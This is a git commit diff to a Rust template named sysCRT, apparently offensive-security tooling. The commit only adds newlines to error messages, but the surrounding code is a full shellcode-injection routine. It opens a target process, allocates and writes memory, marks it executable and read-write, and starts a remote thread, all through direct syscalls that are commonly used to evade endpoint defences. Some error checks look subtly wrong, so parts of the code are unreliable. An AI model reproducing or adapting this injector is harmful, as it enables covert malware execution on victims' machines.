c51e3214ed2a9bff9d7e9723b70d3905174173db
josef.korbel <josef.korbel@citadelo.com>
2023-05-30 17:07:40 +0200

    changes

--- templates/sysCRT/src/main.rs
+++ templates/sysCRT/src/main.rs
@@ -48,26 +48,26 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
     unsafe {
         let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
         if !NT_SUCCESS(open_status) {
-            println!("Error opening process: {}", open_status);
+            println!("Error opening process: {}\n", open_status);
         }
         let mut allocstart : *mut c_void = null_mut();
         let mut size : usize = buf.len();
         let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(alloc_status) {
-            println!("Error allocating memory to the target process: {}", alloc_status);
+            println!("Error allocating memory to the target process: {}\n", alloc_status);
         }
         let mut byteswritten = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
         let mut buffer_length = buf.len();
         let write_status = syscall!("NtWriteVirtualMemory", process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
-            println!("Error writing to the target process: {}", write_status);
+            println!("Error writing to the target process: {}\n", write_status);
         }
 
         let mut old_perms = PAGE_READWRITE;
         let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
         if !NT_SUCCESS(protect_status) {
-            println!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
+            println!("[-] Failed to call NtProtectVirtualMemory: {:#x}\n", protect_status);
         }
 
         let mut thread_handle : *mut c_void = null_mut();
@@ -76,7 +76,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, NULL, handle, allocstart, NULL, 0, NULL, NULL, NULL, NULL);
 
         if write_status != 0 {
-            println!("Error failed to create remote thread: {:#02X}", write_thread);
+            println!("Error failed to create remote thread: {:#02X}\n", write_thread);
         }
     }
 }
